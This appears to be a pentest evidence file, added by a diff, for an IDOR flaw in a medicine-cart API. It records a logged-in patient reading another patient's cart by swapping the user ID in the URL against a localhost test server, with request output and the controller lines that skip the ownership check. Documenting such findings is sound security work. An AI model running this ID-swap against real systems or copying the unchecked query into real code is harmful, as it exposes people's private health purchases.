@@ -1,0 +1,38 @@
+V-13 IDOR: one patient can read another patient's cart
+======================================================
+
+state    : BEFORE the fix
+captured : 2026-09-24T17:41:47.965Z
+branch   : test/it22083500/v11-v15-before-evidence
+commit   : ec2853c
+tool     : Node.js v22.20.0 fetch() — requests sent by security-tests/capture-v11-v15.mjs
+           (the same attacks with the real curl binary: before-curl.txt in this folder)
+target   : http://localhost:4000  (disposable in-memory database, localhost only)
+
+------------------------------------------------------------------------------
+WHAT THIS PROVES
+  The cart route checks that you are *a* patient, but not *which* patient. The
+  user ID comes from the URL, so any logged-in patient can read anyone's cart.
+
+METHOD: black box — two accounts, swap the ID in the URL
+
+  attacker : dana (Patient, id 6ab560a539b92768520592be)
+  victim   : bobby (Patient, id 6ab560a539b92768520592ba)  (seed puts one private row in his cart)
+
+CONTROL — Dana reads her own cart
+> fetch GET $BASE/api/v1/medicines-cart/user-cart/6ab560a539b92768520592be [with dana's session cookie]
+  HTTP 200
+  {"statusCode":200,"data":[{"_id":"6ab560db39b92768520594c3","userId":"6ab560a539b92768520592be","medicineId":"6ab560a539b92768520592c8","quantity":99,"totalPrice":1,"status":"Pending","createdAt":"2026-09-24T17:41:47.888Z","updatedAt":"2026-09-24T17:41:47.888Z","__v":0}],"message":"Cart Fetched Successfully!"}
+
+ATTACK — Dana, with her own cookie, asks for Bobby's cart
+> fetch GET $BASE/api/v1/medicines-cart/user-cart/6ab560a539b92768520592ba [with dana's session cookie]
+  HTTP 200
+  {"statusCode":200,"data":[{"_id":"6ab560a539b92768520594bd","userId":"6ab560a539b92768520592ba","medicineId":"6ab560a539b92768520592c8","quantity":3,"totalPrice":4500,"status":"Pending","createdAt":"2026-09-24T17:40:53.642Z","updatedAt":"2026-09-24T17:40:53.642Z","__v":0}],"message":"Cart Fetched Successfully!"}
+
+  RESULT: 1 row(s) belonging to Bobby returned to Dana — quantity 3, totalPrice 4500, status Pending
+
+WHITE BOX — the ID the query trusts
+  backend/src/controllers/UserCart.controller.js:8:  const { userId, medicineId, quantity, totalPrice, status } = req.body;
+  backend/src/controllers/UserCart.controller.js:44:  const cart = await UserCart.find({ userId: req.params.userId });
+
+  Neither line compares the ID with req.user._id, the user the session belongs to.
